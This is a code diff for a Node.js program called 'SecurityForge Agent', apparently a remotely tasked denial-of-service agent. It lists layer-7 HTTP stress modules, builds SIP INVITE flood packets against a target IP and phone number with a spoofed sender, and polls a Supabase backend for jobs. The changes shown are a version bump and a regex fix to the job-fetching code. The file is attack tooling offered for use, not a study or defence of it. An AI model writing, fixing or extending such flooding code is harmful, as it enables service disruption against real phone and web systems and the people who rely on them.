@@ -1,5 +1,5 @@
 /**
- * SECURITYFORGE AGENT V37.3 (ULTIMATE HYBRID)
+ * SECURITYFORGE AGENT V37.3.1 (ULTIMATE HYBRID + HOTFIX)
  * 
  * [MODULES]
  * - L7 HTTP STRESS: Pulse Wave, Magma, Chaos Vortex, God Mode.
@@ -75,7 +75,7 @@ const MALICIOUS_PAYLOADS = {
       const tag = Math.random().toString(36).substring(7);
       const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
       const toUser = targetNumber || 'stress';
-      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V37.3\r\nContent-Length: 0\r\n\r\n`;
+      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V37.3.1\r\nContent-Length: 0\r\n\r\n`;
   }
 };
 
@@ -85,7 +85,7 @@ const MALICIOUS_PAYLOADS = {
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { 
     res.writeHead(200); 
-    res.end('SecurityForge Agent V37.3 (Ultimate)\nStatus: ONLINE'); 
+    res.end('SecurityForge Agent V37.3.1 (Ultimate)\nStatus: ONLINE'); 
 })
 .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
@@ -108,9 +108,10 @@ const client = axios.create({
 // ==========================================
 const supabaseRequest = async (method, pathStr, body = null) => {
     try {
+        // FIXED: Regex escape for slash
         const res = await client({
             method: method,
-            url: `${SUPABASE_URL}/rest/v1/${pathStr.replace(/^//, '')}`,
+            url: `${SUPABASE_URL}/rest/v1/${pathStr.replace(/^\//, '')}`,
             headers: {
                 'apikey': SUPABASE_KEY,
                 'Authorization': `Bearer ${SUPABASE_KEY}`,
@@ -123,7 +124,7 @@ const supabaseRequest = async (method, pathStr, body = null) => {
     } catch(e) { return null; }
 };
 
-console.log('\x1b[36m[AGENT] Initialized V37.3 (Ultimate). Waiting for jobs...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V37.3.1 (Ultimate). Waiting for jobs...\x1b[0m');
 
 // ==========================================
 // GLOBAL STATE
